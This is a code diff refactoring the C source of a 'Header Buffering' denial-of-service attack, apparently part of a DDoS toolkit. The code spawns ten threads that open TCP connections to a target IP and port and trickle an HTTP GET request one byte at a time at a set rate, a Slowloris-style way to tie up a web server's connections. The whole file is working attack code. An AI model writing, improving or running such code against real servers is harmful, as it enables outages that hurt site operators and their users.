@@ -3,279 +3,171 @@
 #include "../base/make_tcp.h"
 #include "../base/receiver.h"
 #include "../base/subnet_mask.h"
+#include "../base/time_check.h"
 #include "../ddos/header_buffering.h"
 
-unsigned int headbuffer_total;
-unsigned int headbuffer_produced;
+#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
 
-unsigned int headbuffer_per_second;
-double headbuffer_elapsed_time;
+// session counting
+unsigned long g_headbuf_num_total;
+unsigned long g_headbuf_num_generated_in_sec;
+// from main()
+char g_headbuf_src_ip[16] = { 0, };
+char g_headbuf_dest_ip[16] = { 0, };
+unsigned int g_headbuf_src_mask;
+unsigned int g_headbuf_dest_mask;
+unsigned int g_headbuf_dest_port_start;
+unsigned int g_headbuf_dest_port_end;
+unsigned int g_headbuf_request_per_sec;
+// for masking next ip address
+char g_headbuf_now_src_ip[16] = { 0, };
+char g_headbuf_now_dest_ip[16] = { 0, };
+int g_headbuf_now_dest_port = 0;
+// thread
+pthread_mutex_t g_headbuf_mutex = PTHREAD_MUTEX_INITIALIZER;
+pthread_cond_t g_headbuf_cond = PTHREAD_COND_INITIALIZER;
+// time checking
+struct timespec g_headbuf_before_time;
+struct timespec g_headbuf_now_time;
+// request msg
+char g_headbuf_request_msg[__HEADER_BUFFERING_REQUEST_MSG_SIZE__ ];
+// socket
+int g_headbuf_maximum = 5;
+int *g_headbuf_sockets;
+unsigned int g_headbuf_current_idx;
+int *g_headbuf_http_cursor;
 
-char headbuffer_dest_ip[16];
-char headbuffer_src_ip[16];
-
-int headbuffer_dest_port;
-
-int headbuffer_src_ip_mask;
-int headbuffer_dest_ip_mask;
-
-char headbuffer_now_src_ip[16];
-char headbuffer_now_dest_ip[16];
-
-pthread_mutex_t headbuffer_mutex = PTHREAD_MUTEX_INITIALIZER;
-pthread_cond_t headbuffer_cond = PTHREAD_COND_INITIALIZER;
-
-char headbuffer_request[__HEADER_BUFFERING_REQUEST_MSG_SIZE__ ];
-
-int *headbuffer_sockets;
-unsigned int headbuffer_wait_duration = 1.0;
-clock_t *headbuffer_clocks;
-unsigned int headbuffer_current;
-int *headbuffer_http_cursor;
-
-int headbuffer_maximum = 5;
-
-struct timespec headbuffer_time1, headbuffer_time2;
-
-void header_buffering_print_usage(int mode) {
-
-	if (mode == 1)
-		printf(
-				"header buffering Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
+void header_buffering_print_usage(void)
+{
+	printf("header buffering Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
+	return;
 }
 
-void* generate_header_buffering1(void *data) {
+void *generate_header_buffering(void *data)
+{
 	int thread_id = *((int*) data);
-
 	while (1) {
-
-		pthread_mutex_lock(&headbuffer_mutex);
-		//printf("Log[%d] : T<%d>, S<%d>\n", debug_log++, headbuffer_current,
-		//	headbuffer_sockets[headbuffer_current]);
-
+		// *** begin of critical section ***
+		pthread_mutex_lock(&g_headbuf_mutex);
 		//making tcp connection
-		if (headbuffer_sockets[headbuffer_current] == -2) {
-
-			headbuffer_sockets[headbuffer_current] = socket(AF_INET,
-					SOCK_STREAM, 0);
-
+		if (g_headbuf_sockets[g_headbuf_current_idx] == -2) {
+			g_headbuf_sockets[g_headbuf_current_idx] = socket(AF_INET, SOCK_STREAM, 0);
 			int sdbf = 2;
-
-			if ((headbuffer_sockets[headbuffer_current], SOL_SOCKET, SO_SNDBUF, (const char*) &sdbf, sizeof(sdbf))
-					== -1)
+			if (setsockopt(g_headbuf_sockets[g_headbuf_current_idx], SOL_SOCKET, SO_SNDBUF, (const char*) &sdbf, sizeof(sdbf))
+					== -1) {
 				perror("setsockopt failure.\n");
-
-			if (headbuffer_sockets[headbuffer_current] == -1)
+			}
+			if (g_headbuf_sockets[g_headbuf_current_idx] == -1) {
 				perror("sock creation failed\n");
-
+			}
 			struct sockaddr_in servaddr;
 			servaddr.sin_family = AF_INET;
-			servaddr.sin_addr.s_addr = inet_addr(headbuffer_dest_ip);
-			servaddr.sin_port = htons(headbuffer_dest_port);
-
-			if (connect(headbuffer_sockets[headbuffer_current],
-					(struct sockaddr*) &servaddr, sizeof(servaddr)) != 0)
+			servaddr.sin_addr.s_addr = inet_addr(g_headbuf_dest_ip);
+			servaddr.sin_port = htons(g_headbuf_dest_port_start);
+			if (connect(g_headbuf_sockets[g_headbuf_current_idx],
+						(struct sockaddr*) &servaddr, sizeof(servaddr)) != 0) {
 				perror("connect failed\n");
-
-			printf("sock value : %d\n", headbuffer_sockets[headbuffer_current]);
-		}
-
-		//Conditions begin.
-		if (headbuffer_produced >= headbuffer_per_second) {
-			pthread_cond_wait(&headbuffer_cond, &headbuffer_mutex);
-		}
-
-		//Get Time
-		clock_gettime(CLOCK_MONOTONIC, &headbuffer_time2);
-		double headbuffer_elapsed_time = (headbuffer_time2.tv_sec
-				- headbuffer_time1.tv_sec)
-				+ ((headbuffer_time2.tv_nsec - headbuffer_time1.tv_nsec)
-						/ 1000000000.0);
-
-		//If time > 1.0
-		if (headbuffer_elapsed_time >= 1.0) {
-
-			printf("-.\n");
-			headbuffer_produced = 0;
-
-			clock_gettime(CLOCK_MONOTONIC, &headbuffer_time1);
-			pthread_cond_signal(&headbuffer_cond);
-		}
-
-		int sent_size = -1;
-
-		if (headbuffer_sockets[headbuffer_current] >= 0) {
-			sent_size = write(headbuffer_sockets[headbuffer_current],
-					headbuffer_request
-							+ headbuffer_http_cursor[headbuffer_current], 1);
-
-			headbuffer_produced++;
-			headbuffer_total++;
-
-			printf("%d Socket[%d] send %c : %d\n", headbuffer_produced,
-					headbuffer_sockets[headbuffer_current],
-					*(headbuffer_request
-							+ headbuffer_http_cursor[headbuffer_current]),
-					sent_size);
-
-			headbuffer_http_cursor[headbuffer_current] += 1;
-
-			if (headbuffer_http_cursor[headbuffer_current]
-					>= __HEADER_BUFFERING_REQUEST_MSG_SIZE__) {
-				close(headbuffer_sockets[headbuffer_current]);
-				headbuffer_sockets[headbuffer_current] = -1;
 			}
-			headbuffer_current++;
+			printf("sock value : %d\n", g_headbuf_sockets[g_headbuf_current_idx]);
 		}
-
-		if (headbuffer_current >= headbuffer_maximum) {
-			headbuffer_current = 0;
+		// wait a second
+		if (g_headbuf_num_generated_in_sec >= g_headbuf_request_per_sec) {
+			pthread_cond_wait(&g_headbuf_cond, &g_headbuf_mutex);
 		}
-
-		pthread_mutex_unlock(&headbuffer_mutex);
+		// time checking
+		time_check(&g_headbuf_mutex, &g_headbuf_cond, &g_headbuf_before_time, &g_headbuf_now_time, &g_headbuf_num_generated_in_sec);
+		// send 
+		int sent_size = -1;
+		if (g_headbuf_sockets[g_headbuf_current_idx] >= 0) {
+			sent_size = write(g_headbuf_sockets[g_headbuf_current_idx],
+												g_headbuf_request_msg + g_headbuf_http_cursor[g_headbuf_current_idx], 1);
+			g_headbuf_num_generated_in_sec++;
+			g_headbuf_num_total++;
+			printf("%lu Socket[%d] send %c : %d\n", g_headbuf_num_generated_in_sec,
+																							g_headbuf_sockets[g_headbuf_current_idx],
+																							*(g_headbuf_request_msg
+																								+ g_headbuf_http_cursor[g_headbuf_current_idx]),
+																							sent_size);
+			g_headbuf_http_cursor[g_headbuf_current_idx] += 1;
+			if (g_headbuf_http_cursor[g_headbuf_current_idx] >= __HEADER_BUFFERING_REQUEST_MSG_SIZE__) {
+				close(g_headbuf_sockets[g_headbuf_current_idx]);
+				g_headbuf_sockets[g_headbuf_current_idx] = -1;
+			}
+			g_headbuf_current_idx++;
+		}
+		if (g_headbuf_current_idx >= g_headbuf_maximum) {
+			g_headbuf_current_idx = 0;
+		}
+		// *** end of critical section ***
+		pthread_mutex_unlock(&g_headbuf_mutex);
 	}
-
-	return 0;
-
+	return NULL;
 }
 
-void* headbuffer_time_check(void *data) {
-
+void *header_buffering_time_check(void *data)
+{
 	while (1) {
-		pthread_mutex_lock(&headbuffer_mutex);
-		//Get Time
-		clock_gettime(CLOCK_MONOTONIC, &headbuffer_time2);
-		double headbuffer_elapsed_time = (headbuffer_time2.tv_sec
-				- headbuffer_time1.tv_sec)
-				+ ((headbuffer_time2.tv_nsec - headbuffer_time1.tv_nsec)
-						/ 1000000000.0);
-
-		//If time > 1.0
-		if (headbuffer_elapsed_time >= 1.0) {
-
-			printf("-.\n");
-			headbuffer_produced = 0;
-
-			clock_gettime(CLOCK_MONOTONIC, &headbuffer_time1);
-			pthread_cond_signal(&headbuffer_cond);
-		}
-
-		pthread_mutex_unlock(&headbuffer_mutex);
+		pthread_mutex_lock(&g_headbuf_mutex);
+		time_check(&g_headbuf_mutex, &g_headbuf_cond, &g_headbuf_before_time, &g_headbuf_now_time, &g_headbuf_num_generated_in_sec);
+		pthread_mutex_unlock(&g_headbuf_mutex);
 	}
+	return NULL;
 }
 
-void header_buffering_run(char *argv[], int mode) {
-
-	//will be implemented later... ##############
-	/*FILE *get_f;
-
-	 get_f = fopen("./src/ddos/http_request.txt", "rb");
-	 if (get_f == NULL) {
-	 perror("open error! does http_get_request.txt exist?\n");
-	 exit(1);
-	 }
-	 char buffer[__HEADER_BUFFERING_REQUEST_MSG_SIZE__ ];
-	 while (fgets(buffer, __HEADER_BUFFERING_REQUEST_MSG_SIZE__, get_f) != NULL) {
-	 strcat(headbuffer_request, buffer);
-	 strcat(headbuffer_request, "\r\n");
-	 }
-	 strcat(headbuffer_request, "\r\n");
-	 fclose(get_f);
-	 */
-
-	strcpy(headbuffer_request, "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");
-
-	printf("HTTP header msg:\n%s\n", headbuffer_request);
-
+void header_buffering_main(char *argv[])
+{
+	strcpy(g_headbuf_request_msg, GET_METHOD);
+	printf("HTTP header msg:\n%s\n", g_headbuf_request_msg);
 	int argc = 0;
-
 	while (argv[argc] != NULL) {
 		argc++;
 	}
-
-	if (mode == 1 && argc != 4) {
-		header_buffering_print_usage(mode);
+	if (argc != 4) {
+		header_buffering_print_usage();
 		return;
 	}
-
-	headbuffer_produced = 0;
-	get_ip_from_ip_addr(argv[0], headbuffer_src_ip);
-	headbuffer_src_ip_mask = get_mask_from_ip_addr(argv[0]);
-	strcpy(headbuffer_now_src_ip, headbuffer_src_ip);
-
-	get_ip_from_ip_addr(argv[1], headbuffer_dest_ip);
-	headbuffer_dest_ip_mask = get_mask_from_ip_addr(argv[1]);
-	strcpy(headbuffer_now_dest_ip, headbuffer_dest_ip);
-
-	if (mode == 1) {
-
-		headbuffer_per_second = atoi(argv[3]);
-		//socket preparation & clock preparation
-		headbuffer_sockets = (int*) malloc(sizeof(int) * headbuffer_maximum);
-
-		headbuffer_http_cursor = (int*) malloc(
-				sizeof(int) * headbuffer_maximum);
-
-		headbuffer_current = 0;
-
-		int tmp;
-		for (tmp = 0; tmp < headbuffer_maximum; tmp++) {
-			headbuffer_sockets[tmp] = -2;
-			headbuffer_http_cursor[tmp] = 0;
-		}
-
-		headbuffer_dest_port = atoi(argv[2]);
-
+	split_ip_mask_port(argv,
+										 g_headbuf_src_ip,
+										 g_headbuf_dest_ip,
+										 &g_headbuf_src_mask,
+										 &g_headbuf_dest_mask,
+										 &g_headbuf_dest_port_start,
+										 &g_headbuf_dest_port_end);
+	g_headbuf_num_generated_in_sec = 0;
+	g_headbuf_num_total = 0;
+	memset(&g_headbuf_before_time, 0, sizeof(struct timespec));
+	memset(&g_headbuf_now_time, 0, sizeof(struct timespec));
+	/***tmp***/
+	//socket preparation & clock preparation
+	g_headbuf_sockets = (int*) malloc(sizeof(int) * g_headbuf_maximum);
+	g_headbuf_http_cursor = (int*) malloc(sizeof(int) * g_headbuf_maximum);
+	g_headbuf_current_idx = 0;
+	int tmp;
+	for (tmp = 0; tmp < g_headbuf_maximum; tmp++) {
+		g_headbuf_sockets[tmp] = -2;
+		g_headbuf_http_cursor[tmp] = 0;
 	}
-
-	int num_threads = 10;
-
-	int *generate_thread_id, *receive_thread_id;
-	pthread_t *generate_thread, *receive_thread;
-	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
-	generate_thread = (pthread_t*) malloc(
-			sizeof(pthread_t) * (num_threads + 1));
-
+	/***tmp***/
+	const int num_threads = 10;
+	pthread_t threads[9999];
+	int thread_ids[9999];
+	for (int i = 0; i < num_threads; i++) {
+		thread_ids[i] = i;
+	}
+	printf("Header Buffering attack to %s using %d threads\n", g_headbuf_dest_ip, num_threads);
 	int i;
-
-	printf("Header Buffering attack to %s using %d threads\n",
-			headbuffer_dest_ip, num_threads);
-	for (i = 0; i < num_threads; i++)
-		generate_thread_id[i] = i;
-
 	for (i = 0; i < num_threads; i++) {
-		if (mode == 1)
-			pthread_create(&generate_thread[i], NULL,
-					generate_header_buffering1, (void*) &generate_thread_id[i]);
-		if (mode == 2) {
-			printf("thread %d created\n", i);
-			pthread_create(&generate_thread[i], NULL,
-					generate_header_buffering1, (void*) &generate_thread_id[i]);
-			/*RECEIVE THREAD DEACTIVATION*/
-			//pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
-		}
-
+		pthread_create(&threads[i], NULL, generate_header_buffering, (void *)&thread_ids[i]);
 	}
-
-	pthread_create(&generate_thread[i], NULL, headbuffer_time_check,
-			(void*) &generate_thread_id[i]);
-	num_threads++;
-
-	for (i = 0; i < num_threads; i++) {
-		void *status1, *status2;
-		pthread_join(generate_thread[i], &status1);
-		/*RECEIVE THREAD DEACTIVATION*/
-		//pthread_join(receive_thread[i],&status2);
+	pthread_create(&threads[i], NULL, header_buffering_time_check, NULL);
+	for (int i = 0; i < num_threads; i++) {
+		pthread_join(threads[i], NULL);
 		printf("threads %d joined\n", i);
 	}
-
-	printf("Header Buffering attack finished.\n");
-
-	pthread_mutex_destroy(&headbuffer_mutex);
+	printf("Head Buffering attack finished\nTotal %lu packets sent.\n", g_headbuf_num_total);
+	free(g_headbuf_sockets);
+	free(g_headbuf_http_cursor);
+	pthread_mutex_destroy(&g_headbuf_mutex);
 	pthread_exit(NULL);
-
-	free(generate_thread_id);
-	free(generate_thread);
-
 	return;
 }
